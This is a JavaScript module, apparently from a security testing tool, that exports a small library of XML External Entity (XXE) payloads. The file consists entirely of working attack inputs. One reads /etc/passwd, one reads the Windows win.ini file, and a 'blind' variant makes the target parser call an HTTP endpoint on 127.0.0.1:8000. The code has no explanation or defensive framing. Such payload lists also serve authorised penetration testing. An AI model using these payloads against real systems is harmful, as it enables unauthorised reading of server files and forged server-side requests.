/*
|--------------------------------------------------------------------------
| XXE Payload Library
|--------------------------------------------------------------------------
*/

module.exports = {

  basic: [

`<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`

  ],

  windows: [

`<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<foo>&xxe;</foo>`

  ],

  blind: [

`<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:8000/xxe">
]>
<foo>&xxe;</foo>`

  ]

};
